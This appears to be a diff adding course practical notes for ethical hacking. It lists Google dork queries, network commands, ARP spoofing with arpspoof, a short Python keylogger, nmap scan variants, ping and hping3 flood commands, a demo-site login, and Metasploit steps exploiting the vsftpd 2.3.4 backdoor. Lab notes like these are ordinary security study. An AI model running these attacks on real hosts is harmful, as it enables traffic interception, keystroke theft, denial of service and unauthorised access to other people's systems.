@@ -1,0 +1,64 @@
+//--------------- google adv search (prac 1)
+
+inurl:"vartak"
+allinurl:"vartak college"
+blogurl:"how to be happ"
+site:"apple.com  contact"
+intitle:"cosmology"
+allintitle:"cosmology astrology"
+
+//--------------- n/w analysis and arp poisioning 
+
+ipconfig
+ipconfig/displaydns
+ipconfig/release
+ping google.com 
+netstat
+tracert facebook.com
+
+@kali arp -a
+@kali arpspoof -i eth0 -t  <Target ip> <gateway>
+
+//-----------------keylogger (prac 4)
+from pynput import keyboard
+
+def on_press(key):
+    with open("keylog.txt", "a") as f:
+        f.write(str(key) + "\n")
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+
+//----------------nmap
+
+nmap -v scanme.nmap.org
+sudo nmap -sA -T4 scanme.nmap.org   # ACK scan
+nmap -p23,133 scanme.nmap.org   #PORT scan
+nmap -sS scanme.nmap.org   #SYN scan
+nmap -sF -T4 scanme.nmap.org   #FIN scan
+Sudo nmap -sN -p22 scanme.nmap.org #NULL scan
+sudo nmap -sX -T4 scanme.nmap.org   #XMAS scan
+
+
+//-------DOS 
+#WIN    ping -t -l 65500 <target ip>
+#kali   man hping3
+        hping3 -v -c 100 -d100 <target ip>
+
+//-------session imperination
+
+
+link: techpanda.org
+email: admin@google.com
+password: password2010
+
+
+//-------metasploit
+
+>ifconfig
+>nmap -T4 -A <target ip>
+>search vsftpd 2.3.4
+>use exploit/unix/ftp/vsftpd_234_backdoor
+>show options
+>set rhost <target ip>  //-----to find ip nslookup google.com
+>exploit
